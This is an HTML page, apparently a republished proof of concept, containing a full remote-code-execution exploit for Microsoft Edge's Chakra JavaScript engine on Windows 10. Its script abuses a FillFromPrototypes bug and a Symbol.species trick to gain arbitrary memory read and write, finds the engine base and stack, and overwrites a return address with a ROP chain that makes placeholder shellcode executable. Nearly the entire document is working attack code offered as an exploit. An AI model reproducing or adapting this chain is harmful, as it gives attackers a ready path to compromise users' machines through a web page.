<html>
    <head>
    <title>Microsoft Edge Windows 10 RCE Exploit | TheBlaCkCkCoDeR</title>
        <script src="long.min.js"></script>
    </head>
    <body>
        <script>
            var Long = dcodeIO.Long;
            var dv;
            var fdv = new DataView(new ArrayBuffer(8));
            var x = (new Array(56, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)).slice();
            var [hi, lo] = PutDataAndGetAddr(x);
            [hi, lo] = [hi|0, (lo + 0x58)|0];
            TriggerFillFromPrototypesBug(lo, hi);
            var vtable = Read64(new Long(lo - 0x58, hi, true));
            var chakraBase = Read64(vtable).sub(0x274C40);
            var threadCtxPtr = Read64(chakraBase.add(0x735EA8));
            var stackLimit = Read64(threadCtxPtr.add(0x388));
            var stack = stackLimit.sub(0xC000).add(10*1024*1024);
            var retPtr = chakraBase.add(0x162A1D);
            var retPtrAddr;
            for (var i = 8; i < 32 * 1024; i += 8)
            {
                var val = Read64(stack.sub(i));
                if (val.equals(retPtr))
                {
                    retPtrAddr = stack.sub(i);
                    break;
                }
            }
            var sc = unescape("%ucccc%ucccc");
            var [shi, slo] = PutDataAndGetAddr(sc);
            var shcodeAddr = Read64((new Long(slo|0, shi|0, true).add(0x20)));
            var filler = new Long(0, 0, true);
            var rop = [
                chakraBase.add(0x1DA2F5),
                shcodeAddr.and(new Long(0xFFFFF000, 0xFFFFFFFF, true)),
                new Long(0x1000, 0, true),
                new Long(0x40, 0, true),
                chakraBase.add(0x1DA2CB),
                filler, filler, filler, filler, filler, filler,
                new Long(0, 0, true),
                filler, filler, filler, filler, filler, filler,
                filler, filler, filler, filler, filler, filler,
                shcodeAddr
            ];
            for (var i = 0; i < rop.length; ++i)
            {
                Write64(retPtrAddr.add(i * 8), rop[i]);
            }
            alert("Boom!");
            function TriggerFillFromPrototypesBug(lo, hi)
            {
                x[2] = lo;
                x[3] = hi;
                x[10] = (lo - 0x38)|0;
                x[11] = hi;
                x[8] = 0x200;
                x[14] = (lo - 0x58)|0;
                x[15] = hi;
                var a = new Array(0x11111111, 0, 0x22222222, 0, 0x33333333, 0, lo, hi, 0x55555555, 0);
                var handler = {
                    getPrototypeOf: function(target, name) {
                        return a;
                    }
                };
                var p = new Proxy([], handler);
                var b = [{}, [], "abc"];
                b.__proto__ = p;
                b.length = 4;
                a.shift.call(b);
                dv = b[2];
            }
            function PutDataAndGetAddr(t)
            {
                var d = new Array(1,2,3);
                class dummy {
                    constructor() {
                        return d;
                    }
                }
                class MyArray extends Array {
                    static get [Symbol.species]() {
                        return dummy;
                    }
                }
                var a = new Array({}, t, "theori", 7, 7, 7, 7, 7);
                function test(i) {
                    return true;
                }

                a.__proto__ = MyArray.prototype;
                var o = a.filter(test);
                var h = [];
                for (item in o) {
                    var n = new Number(o[item]);
                    if (n < 0) {
                        n = n + 0x100000000;
                    }
                    h.push(n);
                }
                return [h[3], h[2]];
            }
            function SetAddress(addr)
            {
                x[14] = addr.low|0;
                x[15] = addr.high|0;
            }
            function Read32(addr)
            {
                SetAddress(addr);
                return new Long(fdv.getUint32.call(dv, 0, true), 0, true);
            }
            function Read64(addr)
            {
                SetAddress(addr);
                return new Long(fdv.getUint32.call(dv, 0, true), fdv.getUint32.call(dv, 4, true), true);
            }
            function Write32(addr, val)
            {
                SetAddress(addr);
                fdv.setUint32.call(dv, 0, val.low|0, true);
            }
            function Write64(addr, val)
            {
                SetAddress(addr);
                fdv.setUint32.call(dv, 0, val.low|0, true);
                fdv.setUint32.call(dv, 4, val.high|0, true);
            }
        </script>
    </body>
</html>
